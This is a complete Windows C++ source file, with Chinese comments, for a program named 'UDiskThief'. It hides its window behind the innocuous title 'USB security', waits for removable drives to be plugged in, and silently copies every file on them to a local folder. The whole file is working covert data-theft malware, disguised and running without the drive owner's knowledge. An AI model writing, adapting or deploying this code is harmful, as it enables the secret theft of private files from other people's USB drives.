#include <Windows.h>
#include <Dbt.h>
#include <stdio.h> 
using namespace std;
#include "resource.h"

//拷贝线程句柄
HANDLE	g_hThreadCopy = NULL;

//拷贝到目的地路径
TCHAR	g_szDestPath[MAX_PATH] = "D:\\UDiskTheif";

//获取当前插入设备对应磁盘编号 A--Z
char FirstDriveFromMask(ULONG unitMask);

//判断路径是否存在
BOOL IsDirectoryExist(LPCTSTR strPath);

// 开启拷贝文件线程
HANDLE StartCopyThread(char* szRootPath);

// 停止拷贝线程函数
void StopCopyThread();

//线程拷贝函数
DWORD WINAPI CopyDataProc(LPVOID lpParam);

//拷贝指定路径下所有文件
void Copy(char *lpszSourcePath, char *lpszDestPath);

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(
	HINSTANCE hInstance,		//当前程序运行的实例句柄，每运行一次操作系统会分配一个句柄值
	HINSTANCE hPrevInstance,	//当前实例的前一个实例句柄
	LPSTR lpCmdLine,			//命令行参数
	int nCmdShow)				//窗口显示方式
{
	TCHAR szAppClassName[] = TEXT("UDiskThief");
	WNDCLASS wndClass;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
	wndClass.hInstance = hInstance;
	wndClass.lpfnWndProc = WindowProc;
	wndClass.lpszClassName = szAppClassName;
	wndClass.lpszMenuName = NULL;
	wndClass.style = CS_VREDRAW | CS_HREDRAW;//

	RegisterClass(&wndClass);

	//创建窗口，窗口是通过句柄来标识
	HWND hWnd = CreateWindow(szAppClassName, TEXT("U盘安全"), WS_OVERLAPPEDWINDOW, 200, 200, 300, 150, NULL, NULL, hInstance, NULL);

	if (hWnd == NULL)
	{
		MessageBox(NULL, TEXT("创建窗口失败"), TEXT("提示"), MB_ICONERROR | MB_OK);
		return 0;
	}


	ShowWindow(hWnd, SW_HIDE);
	UpdateWindow(hWnd);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);	//将虚拟键消息转为字符消息
		DispatchMessage(&msg);	//分发消息到窗口回调函数，将消息回传给操作系统
	}
	return 0;
}

//窗口处理回调函数
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static PAINTSTRUCT ps;
	TCHAR *pszRootPath = NULL;
	switch (uMsg)
	{
	case WM_PAINT:
	{
		EndPaint(hWnd, &ps);
	}
	return TRUE;
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		delete[] pszRootPath;//释放内存
		PostQuitMessage(0);
		break;
	case WM_DEVICECHANGE:
		switch (wParam)
		{
			//已插入计算机，并且可以使用
		case DBT_DEVICEARRIVAL:
		{
			//lParam 指向结构体的指针，标识插入的设备
			DEV_BROADCAST_HDR* lpdb = (DEV_BROADCAST_HDR*)lParam;
			//既然是逻辑卷，获取盘符名称
			DEV_BROADCAST_VOLUME* lpdbv = (DEV_BROADCAST_VOLUME*)lpdb;
			char chDisk = FirstDriveFromMask(lpdbv->dbcv_unitmask);

			pszRootPath = new TCHAR[MAX_PATH];
			wsprintf(pszRootPath, "%c:", chDisk);

			//判断驱动器类型 可移动设备
			if (DRIVE_REMOVABLE == GetDriveType(pszRootPath))
			{
				Sleep(500);
				//创建开始复制线程
				g_hThreadCopy = StartCopyThread(pszRootPath);
			}
			return TRUE;
		}
		//设备已被删除
		case DBT_DEVICEREMOVECOMPLETE:
			StopCopyThread();
			return TRUE;
		}
		return TRUE;
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// 获取当前插入设备对应磁盘编号 A--Z
char FirstDriveFromMask(ULONG unitMask)
{
	char i;
	for (i = 0; i < 32; i++)
	{
		if (unitMask & 1)
			break;
		unitMask = unitMask >> 1;
	}
	return i + 'A';
}

//判断目录是否存在
BOOL IsDirectoryExist(LPCTSTR lpszPath)
{
	//获取指定文件或目录的文件系统属性。失败返回：INVALID_FILE_ATTRIBUTES
	DWORD dwFileAttr = ::GetFileAttributes(lpszPath);

	if (dwFileAttr == INVALID_FILE_ATTRIBUTES)
		return FALSE;
	if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY)
		return TRUE;
	else
		return FALSE;
}

// 开启拷贝文件线程
HANDLE StartCopyThread(char* szRootPath)
{
	StopCopyThread();

	//在主线程的基础上创建一个新线程
	return CreateThread(
		NULL,		//线程安全属性
		NULL,		//堆栈的初始大小（以字节为单位）。 如果为0，则新线程使用可执行文件的默认大小。
		CopyDataProc,	//线程函数的起始地址
		szRootPath,	//传递给线程的参数指针
		NULL,		//线程创建标识
		NULL);		//线程ID	 
}

// 停止拷贝线程函数
void StopCopyThread()
{
	if (g_hThreadCopy)
	{
		CloseHandle(g_hThreadCopy);
		g_hThreadCopy = NULL;
	}
}

//线程拷贝函数
DWORD WINAPI CopyDataProc(LPVOID lpParam)
{
	char *szRootPath = (char*)lpParam;
	//开始复制
	Copy(szRootPath, g_szDestPath);
	StopCopyThread();
	return 0;
}


//拷贝指定路径下所有文件
void Copy(char *lpszSourcePath, char *lpszDestPath)
{
	//拷贝到目的地,判断路径是否存在
	if (!IsDirectoryExist(lpszDestPath))
	{
		//创建路径
		SECURITY_ATTRIBUTES sa = { 0 };
		CreateDirectory(lpszDestPath, &sa);
	}

	//查找到的所有类型的文件*.*
	TCHAR szSourceFindPath[MAX_PATH];
	strcpy_s(szSourceFindPath, lpszSourcePath);
	strcat_s(szSourceFindPath, "\\*.*");     //文件名可以包括通配符，例如星号（*）或问号（？）。

	WIN32_FIND_DATA FindFileData = { 0 };	//存储文件或目录的信息

	HANDLE hFinder = ::FindFirstFile(szSourceFindPath, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFinder)
	{
		return;
	}
	while (TRUE)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			//如果为文件夹 包括. 或者..
			if (FindFileData.cFileName[0] != '.')
			{
				//递归的来源路径
				TCHAR szSourcePath[MAX_PATH];
				strcpy_s(szSourcePath, lpszSourcePath);
				strcat_s(szSourcePath, "\\");
				strcat_s(szSourcePath, FindFileData.cFileName);

				//存储到本地磁盘路径
				TCHAR szDestPath[MAX_PATH];
				strcpy_s(szDestPath, lpszDestPath);
				strcat_s(szDestPath, "\\");
				strcat_s(szDestPath, FindFileData.cFileName);

				//递归调用
				Copy(szSourcePath, szDestPath);
			}
		}
		else
		{
			//新的文件
			char szNewFileName[MAX_PATH];
			char szUsbFileName[MAX_PATH];

			wsprintf(szNewFileName, "%s\\%s", lpszDestPath, FindFileData.cFileName);
			wsprintf(szUsbFileName, "%s\\%s", lpszSourcePath, FindFileData.cFileName);

			CopyFile(szUsbFileName, szNewFileName, TRUE);
		}
		if (!FindNextFile(hFinder, &FindFileData))
			break;
	}
	FindClose(hFinder);
}